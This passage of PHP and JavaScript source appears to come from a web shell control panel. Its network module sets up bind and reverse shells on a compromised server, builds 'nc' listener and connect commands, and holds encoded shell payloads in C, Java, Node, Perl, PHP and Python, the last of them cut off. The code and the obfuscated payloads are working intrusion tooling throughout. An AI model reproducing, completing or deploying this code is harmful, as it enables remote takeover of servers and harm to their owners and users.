            rawDetails = `Bind shell started on port ${strs[1]}`;
            rawDetailsFail = `Failed starting bind shell on port ${strs[1]}`;
        }

        evl = ``;
        chkPrc = ``;
        urls = `'.__DATA_DIR_URL__.'/tmp/'.basename($GLOBALS['ER0_string']['task_dir']).'/`;
        nmf = RWS[0].n+`_net_proc.php`;

        if(RWS[0].t == `reverse`){
            txt = `<b class="text-foreground">`;
            dtl = "charcodeEnc(`Connection from "+txt+strs[0]+":"+strs[1]+"</b> closed!`)";

            upd = `$("#proccessId_${indx}").val("()")`;
            evlOnClose = btoa("task_manager(`network`,nmf,`remove`,`"+upd+"`)");

            evl = `
            notifyCheckPrc = {
                type : "failed",
                detail : ${dtl},
                redirect : false,
                icon : atob("PGkgY2xhc3M9ImJ4IGJ4LXNpdGVtYXAgYngtdGFkYSB0ZXh0LTV4bCI+PC9pPg=="),
                status : "Connection Closed",
                color : "red",
                delay : 3000,
            };
            notifyCheckPrc = JSON.stringify(notifyCheckPrc);
            const checker = new ConnectionChecker("${urls+nmf}?chkprc=${RWS[0].n}", "${strs[0]}:${strs[1]}", notifyCheckPrc, true, "${evlOnClose}");
            checker.start();
            `;
        }

        eval_this = `
        $("#proccessId_${indx}").val(charcodeDec(data));
            if(data != "") {
                ${evl}
            } else {
                notify("failed", charcodeEnc("${rawDetailsFail}"), false,atob("PGkgY2xhc3M9ImJ4IGJ4LXNpdGVtYXAgYngtdGFkYSB0ZXh0LTV4bCI+PC9pPg=="), "FAILED!");
            }
        `;

        chkPrc = `checkProccess("`+RWS[0].n+`", "get", false, eval_this)`;

    }

    notify(`loading`);

    const sendRequest = new AjaxRequest("POST", SCRIPT_PATH, DATA);
    sendRequest.send(
        function (data) {
            data = JSON.parse(data);

            if(charcodeDec(data.update) != `NOTUSE`){
                eval(charcodeDec(data.update));
            }

            if(charcodeDec(data.status) == `log`){
                console.log(`status => logging`);
                console.log(`detail => `+charcodeDec(data.detail));
            } else {
                ttl = (charcodeDec(data.status) == "success" ? "CONNECTED!" : "FAILED!");
                notify(charcodeDec(data.status), data.detail, false,`<i class="bx bx-sitemap bx-tada text-5xl" ></i>`, ttl);
                if(charcodeDec(data.status) == "success" && chkPrc != ``){
                    task_manager(`network`,nmf,`add`,chkPrc);
                }
            }
        },
        function (status, error) {
            if(status != 0){
                console.error("AJAX Error:", status, error);
                clr = `red`;
                if(status >= 500){
                    clr = `yellow`;
                }
                notify(`error`, charcodeEnc(status +" "+ error),true, `<i class="bx bx-error bx-tada text-5xl" ></i>`, `ERROR!`, clr, 10000000);
            }
        }
    );
}'
            ;
        }
    }

    public static function __network()
    {
        if (isset($_POST['key']) && Request::__post_request('key') == 'NETWORK') {
            $type = Utils::__charcode_dec(Request::__post_request('type'));
            $ip = Utils::__charcode_dec(Request::__post_request('ip'));
            $port = Utils::__charcode_dec(Request::__post_request('port'));
            $pass = Utils::__charcode_dec(Request::__post_request('pass'));
            $use = Utils::__charcode_dec(Request::__post_request('use'));
            $dataRaw = Request::__post_request('dataRaw');

            $path = Utils::__string_dec(Request::__post_request('dir'));
            $path = Utils::__construct_path($path);
            chdir($path);
            $STATUS = 'failed';
            $DETAIL = '';
            $UPDATE = 'NOTUSE';

            if (empty($dataRaw) || $dataRaw == null) {

                $data_config = array(
                    'data' => ["network"],
                    'dir' => $path,
                    'hiddenVal' => ['f', 'n', 't', 'u', 'pw'],
                    'titleHref' => null,
                    'action' => [[['button', 'connectionId'], 'use_hidden', 'bind', 'NET'], [['button', 'commandId'], 'copy', 'copy cmd'], ['button', 'kill', 'kill'], ['button', 'delete', 'delete']],
                    'jsonKey' => [['EMPTY', ['input', 'disabled'], 'proccessId'], 't', 'u', 'pw', ['con', ['input', 'disabled'], 'connectionId'], ['cmd', ['input', 'disabled'], 'commandId']],
                    'statusKey' => ['path' => 'f', 'file' => 'n'],
                    'showStatus' => false,
                    'rowStyle' => ['EMPTY' => ['font-normal', 'text-themecolor-400'], 't' => ['font-normal', 'text-themecolor-orange'], 'pw' => [['font-bold', 'ifNot=none'], ['text-themecolor-green', 'ifNot=none']], 'con' => ['font-normal', 'text-themecolor-400'], 'cmd' => ['font-bold', 'text-themecolor-400']],
                    'tableHeader' => ['Proccess', 'Type', 'Use', 'Password', 'Connection', 'Connect CMD'],
                    'return' => ''
                );

                $createShell = self::__create_connection($type, $ip, $port, $pass, $use);

                if (empty($createShell['err'])) {
                    $data_config['return'] = 'array';
                    $saveData = Utils::__get_data($data_config);
                    $datas = array(
                        'f' => rtrim($createShell['path'], __DIRECTORY_SEPARATOR__),
                        'n' => $createShell['name'],
                        't' => $type,
                        'u' => $use,
                        'pw' => $pass,
                        'con' => $createShell['connector'],
                        'cmd' => ($type == 'bind' ? "nc " . gethostbyname(__SERVER_HOST__) . " $port" : "nc -lvnp $port")
                    );

                    array_push($saveData, $datas);
                    Utils::__save_data('network', $saveData);

                    $data_config['return'] = 'tbody';
                    $updateList = Utils::__charcode_enc(Utils::__get_data($data_config));
                    $STATUS = 'success';
                    $DETAIL = ucfirst($type) . " shell created.";
                    $UPDATE = '$(`#table-body-network`).html(charcodeDec(`' . $updateList . '`));';
                } else {
                    $DETAIL = 'Failed to create ' . ucfirst($type) . ' shell, ERR : ' . json_encode($createShell['err']);
                }
            } else {
                $res = self::__run_exploit($dataRaw);
                if(is_array($res)){
                    $STATUS = $res['status'];
                    $DETAIL = $res['detail'];
                    $UPDATE = $res['update'];
                } else {
                    $DETAIL = $res;
                }
            }

            $response = [
                'status' => Utils::__charcode_enc($STATUS),
                'detail' => Utils::__charcode_enc($DETAIL),
                'update' => Utils::__charcode_enc($UPDATE)
            ];
            header('Content-Type: application/json');
            echo json_encode($response);
            exit();
        }
    }

    public static function __create_connection($type, $ip, $port, $pass, $use)
    {
        $con = $type == 'bind' ? "0.0.0.0:$port" : "$ip:$port";
        $id = uniqid();
        $basePath = __DIRECTORY_DATA__ . __DIRECTORY_SEPARATOR__ . $GLOBALS['ER0_string']['temp_dir'] . __DIRECTORY_SEPARATOR__;
        $data = [
            'name' => '.' . md5($id),
            'path' => $basePath,
            'type' => $type,
            'use' => $use,
            'connector' => $con,
            'err' => []
        ];

        return $data;
    }

    public static function __run_exploit($dataRaw)
    {
        $dataRaw = json_decode(Utils::__charcode_dec($dataRaw), true);
        $con = explode(":", $dataRaw[1]['added']);
        $IPS = $dataRaw[0]['t'] == 'bind' ? '' : $con[0];
        $PORT = $con[1];
        $pass = $dataRaw[0]['pw'];
        $lang = $dataRaw[0]['u'];
        $type = $dataRaw[0]['t'];
        $name = $dataRaw[0]['n'];
        $source = '';
        
        switch($lang){
            case 'gcc':
               $source = "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";
               break;
            case 'java':
               $source = "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";
               break;
            case 'node':
               $source = "zVdfT+NGEH8mUr7DKiCtrcvZhNC7FsRVHCAVCY4IQ++kJCWOs0ksnN10d5NQYVf9AH3ksc/9YHySztqxY28MjXp9uFVEsjOzv5mdv4ttI8fj/lQixv2RT90A9X9D/eb7/XvUHks5FQe2PfLleNa3PDaxY07yt1ut2Da6ZAN/6JOBOmbZjkvFl2lQelQA72EawLFqxWNUSPSIxNRdUBShI8TJrzOfEwN7Yz8Y3E0584gQ2DxMhSmReTHY5phM5HksOZcyp64QC8YHIFLbbh07zuer69O7n48vbs+2axmEGJMgAJGlZmsauHLI+MSauNIbG/YvC5/avol+RNibDCzyQDA6QNjuA1mMcayvWpm7HHkBB5xHzMlAidQ6D41+u3HYbExq9WoFS+IGBfpeQmfcpSNS4DQTTj+YFen7CZ2CeXms3cPm+4SzGPuyeAQY1UoUW+kPjX+5pPlYrWzp11DAW1tbK/tTQs7wlJRZnBJypqaklY01RVC2Rcq84Yx60mcUIsIWd32XUsINwbx7Ik0EhiFYScgGriTSnxAwk5IFOoWtYVqSnTtXjuQ+HcGOE7ijB0lxg+sII2xaYtYXkhu7ddT4QaXJCi/RBWi9hKrWziP4oZ1cuhshZIUYYyvMGMo7QL+DpcviMASFIX4ZLAwtC4FVGlinh6CydGGQRuHLWAiDvtDSsRTSuixgvYhkxUQA05E6sEqwwtfAQmzBCteuiJBprikOY8OsV+6oMV6+42sYzvEnZw3DxmWye/d7+yuoTGCZ8d3o+ekP+KC07bW4P/8eOXEnSVgqoZeHknxPz3wLH3Wz4pXbb7opJS7hbuRAm1DFeCugMrSbHOjuQNszENveBPeEQa0ldY42wPUy8Y3QT9POgDZB33lMO0n0DUerQzu0t+xXSTu0FhyMNJK2Za73TyLjVDyjc58zOiFUGlkH5UTOOE13at2cXV/CQHuQhE/e7n33zmMB47i+Eji5OD+5uri6BqFGnn7rnAGNCUsF/5wOGbRd9ZO6E5IT++nKufl0fHkWi46ZkIpvmDmJltM4QL0OXYZgOTNUDP6E+xvFEO8otVqw0PNff2uZsJOq1UFNgGwX8+j3ndbnU12u26HPT08grOHqqpczIxtjyUhx+Wiee1So7WEhSGOXDgKyqgZ90hUiXXO+tC5Q890u+ujTwbLRfECt5QMHRmk60AKyevd8nA2H8VjDySslBwv6MOS+C7PRUN8mOvqQzwkN4s2RmrkujNhsvsL3xDAzXLX8ITJ03UdHGZaZVxDbsj7nC3hqJd4kVDmzNK8Py+TFWImrN6YRP+/qqI3f+rhbh6cnYB3AF0ynNDhAqau90hKhSIcUY0vIgU/hSSFmKnNL+WwWe7Wm/FTLe7UQyJhaDkA4/88AWVBLTqfWa+dfQsBewARReaHnRM7cez8I1vxQcFyESCDIWsQLSX1O527gD7IEsTp04zxPV3muZ1YsazPrkSpFVS1aAaEjOY7zs6m9LqGDzWMo+FfD8jiBEeHEJEOv2dSY5IQV+EISGuO397olHlT4LCBWwEZG7yKWhmJC0A2mjEtoYMujUS9FTixPfFlm+75ue+zggu25FpNZFv9olplYXpP5C2xajf9zJb5WhV9VgV9VfV9XeZtWXVnFRcUUqVb+AQ==";
               break;
            case 'perl':
               $source = "zVbdctpGFL7GM36HY1AsmBIwtpt0IPKEAm09sQ2D7CQd41IhFrNjsStLwsYTkekD9NKXve6D+Ul69kcgftLraBhbe77znT17/la5vfI0DMoDysqEPYBPAm93Z3cnB7YbUD8CHtBbyhwPBk8wOHp7fAfX4yjyw2q5fEuj8XRQcvmkLBH190aQz/mQjigZClapbDss/Ox7W5khYjPfuxGbTkMCp+1q1ebuHYlquzsGDy3jj7Z4850wfOTBECzI5jp12/7U7jb7H+tnV61cVigERGK9WWVwXakdVSZSGhF0PSU+VGIeOOyWpIEjBQy86Yr4WIkZDyYpQwe1o7cKeBzTaIWg5HSUF75/nZQfMbC08GV3J5N4KPDMwjG1Wvqj1okbarXcXa0Xm4rlfHcnnA4gHPPH/sBhjAQgdps8geF6lLAIFcMxHYl4Aj7G0IlIRCfCgMddxxPvCaYNWHB/n1ciKZbOQik2TbMU41qcpI+PRsw4NvGPucGI41IJwNSMP6FcThCEIN7QBxNNxSWtL9QXCBLW1UvyHRlavYfPkhBvYcRmCZ84cQgphV4hsRbLTUqbTi3Wq05tUbTrF3aiWDZTyOHd4fFSH+Uq4S/Pf+EPkv7oBPThJ7DHxPNAQaIrVLrV+nv44TnUsa5/uFGFapMwpJzBVUgCXZzVpKRz2NRBbpPT4FhpbiRosMFxF+AWZjOpX9hkLor7+wtbjxVE84aEDfO6M4u634oHBdXI6HU4trJk5vMggstW99yaRSSYvD788Y3LPR7UNNQ4O220z9pdq1IDLbqyW10r91vbvhRvuYVcSC7q5y2FobxjVyyzx/RUeXn+G53Ly9D2DEHVMX3551/Q0sSEphSQcC2T8rVndD41tfimx16enxHTLG3HTHzGfWvyngnH8JpunZLy9K8a7XO702q8gvKHbG0uhrh1SyI/4BEfPDFnQvJm5PqmiFkob4q8Xdzv/NI/vWhdFvftduND377sturnRSMqxPGQknxB7fa+3v31o2VV1Dz2LUOsrw9uVGIiYY37wpzdPusLQ2jQbve7LYxLvdnsFisyh3iIISoJdWc4DPqU5Q2/eHohVPr1i98LqV0zHg0jwlD9KCVFuR9QnM3ZMwlTdgvYCTJOho8zqseySg2D6BHIVwpiqifjYznc+8IBnNeO6xL0XACNItiF2lKZjiC/l1ZfMSUeRmZRDfDKv6M+RFyuAXMXOLI/0YAyDyOHeuGSKys27ZNPxQ034sFdft2DIRlRhmNR6uzva10LDqQ3eNDM6lFxrXsFz5O1P3fO4OjNAfyModcT8gQ6+pugCtkiyB4SLOEIZf5UXHzvjMaJFrtjPvE1okXCL61K7mHxibHYP+M5YaI7B+Lh50mCLF07ZQ+Oh2dJ2CJ1KW/m8t9cHzF1SyNbVUI6EzloYBDQWMBdHKqrIPcJA/uyeXqB277bx12MBn6fARYVZJtTX2FVMPayte3M9tUlUk+2UxH8P26r2/02F8FtXDIjLmBTL9RbKNim6Ho8JDoim3J5rm9C6Pc3MfRrHSMzGsGBKPcWC6cBATcdcQmvlvimjyJNYgH6A0tNIaDYwE4gBCvp0ya0T3rSYzEt59HhtnlkjPWyopbUwv7BBo44TptxesIYjrU2igyaxvVtiiPIcNLydDFKvzIi1yraRcy0nS3UEomonDWRKAgtQmqS6vS+yYlXsriat/VMqdCQLyINOAlq8/8A";
               break;
            case 'php':
               $source = "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";
               break;
            case 'python':
               $source = "1Vfdbts2FL4PkHdg5QWWUIeOnXQtXLiAl7hrsCQ2rHTtYHueLFG2EJkSSDo/iD30AXaZy13vwfIkO6QsWZLlJLvr2CAVz/n4kefk/JClV9U5Z9WxR6uEXqPwTkwDuruzu1NCps28UKCAeROPWj4a36Hx4dujK9SfChHyRrU68cR0PsZ2MKsqTfR7KBefB47nesSRq3DVtCj/GvqFKznobkN/KDf1ZmHABGIk+eTzccgCm3CeiIL1J79LfQf2FRHJVHgzYHFZMEOOJYicopUqnssdQ4vzm4A5qIm0Urdlml86vZPRr62zz+2SJgG2z0B3v7uDYJQZccoNpA1ua+N+7f1hbaZVVhpBLD+tqq9VAbPohKSVh2vl2J9nVEdrFQ3YLEV68P7w7Vp5M/VEZiHodneWyosu+AhTCyxugllUaI1o0cqWK3IH6zTkBgzBN/Ko1Kil4OtZKEaAcrUBvQdxPz7GcPn48Nfjwzc9kqpzD5c/fDbbvUgSnWi4RI9//4OyoE8d8/Kidd7OERpA149kyn3D5Z8/dL+c5FDDAX18eABoljO3KRjvEBfxaXAzGluUEqbbvkeoGEWBYax8EP/xRzS4ATPjKYapbmAumCunurb32/7ebH/PQXufGnvnjT1TMyKCiFx5SNMikRwZMxDCi3K5jBexXMYNiEcwcsjyYlGGX+WtTIsFxvD3zjH9garVPBKgaLGVB5VhqwXO8UiaDSQQbaPBSgZMOZoBjE2ixRNMizKGscgbhpBh5PdcqCPh7aZl5VtNe4LAbF2YeYJquQBZv6ofrXli/SrFZY58gx8UF7wu867fIXNKfB9FKpll2dCN5N/Dj7QrY2//9TCbySYUYi+g6DOHFMia0ch5ApXmACo9z3kcQELZQtKiZzntBPwC5pO48KPnme/ThWH5/f6NBnRAk8KTqXCYE+roUXnChNqBQ/TyXLj778qGIcMuqo8QirodV0PZW6GUrbss7gYhobpdiZDNSzYn8C2cYC6aadhpt63khLFCuUfz4lX9ZETMGVU744gXM2I5uoFeJ0IgzQihJ0FxztkUm2SpcFjblGp/rzLtTw4XrLWx6/mEBrqxlm9zRDrVEepr6qbEp1oFafueNqxk9ZHd7qZUeq9ALJ2XF4eMkFtij1zaBDM4EdxzchC4qTXvsyI5tMt271yD1n4rCJvt19/8aAd+wLRKAfT47PS4c9bpSXitECEbu9SWZPOWk1IhLG7tCbQY1jVrgPgfXirSVqQaSC508I3liTieiM9JKuSAzSdIJlIjSyfYXWPTVUxFKCP2tV47qB8Z2CEq7DUV9pqRC4Vbm4SigEZebHPQ7LHiAekCyaAzA31ABwV6OcZwJkYgGC1mT3Wm2c4A6f3fB3z42oBUYBXk+taENwFz+vNFp9c+bplto5gL9htv2WalhrAPLTHFHnc8po/xhAXzUK8ZxhPL5IB19jS3ZPsKO6qX26rLlpVbnJgcYS5kFVFFlj2xubQSoBZ1lPPh+yn3544s0ZvAJ062KrkfLYDEVTO2u5GpypCfGpRc8OSECPsmKsDaB/USmkjL7ji22ORaPTLkySeGfGPU43YCkEm/Bm854mcAhxsAOZuqWV3Bk8OTW8ikmqruEu1RoYcw43L3VZ9T/+mrWevj6PSifVmJtWbn+JeRedlrt87lMlVBQROEyQqzczaSqMyiUa8NVad1ctKroGj3Qgs5hgbg6Lp2gNU/iP4wjhWOfY8LWPLGiLurPL2rnSmxRycI7jjqCXofLuHyq6l9JLKwRmzWB2jLlvQDtmyZ9ukGVlgI1MuG+4SEyqNPhMrWIpWKO10zv3bP0E/ggNWV9gPqrt7PUP1fkkIeDedilHp0ZyodvL68UE8qXtF6d4OiieLvwugfwz3i6j9kS2